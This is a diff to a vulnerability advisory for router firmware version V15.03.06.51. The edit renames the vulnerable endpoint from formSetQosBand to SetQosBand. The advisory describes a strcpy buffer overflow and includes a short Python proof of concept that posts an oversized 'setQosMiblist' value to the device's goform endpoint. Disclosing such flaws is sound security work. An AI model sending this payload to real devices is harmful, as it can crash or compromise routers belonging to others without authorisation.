@@ -6,7 +6,7 @@ version: V15.03.06.51
 
 ## Description:
 
-There is a buffer overflow in httpd/formSetQosBand
+There is a buffer overflow in httpd/SetQosBand
 
 ## Source:
 
@@ -27,7 +27,7 @@ p eaqul list, if list contains '\n', get into if ,finally call strcpy, cause buf
 
 ## POC
 ```
-url = "http://192.168.1.13/goform/formSetQosBand"
+url = "http://192.168.1.13/goform/SetQosBand"
 payload = 'A'*0x1000 + '\n'
 
 r = requests.post(url, data={'setQosMiblist': payload})
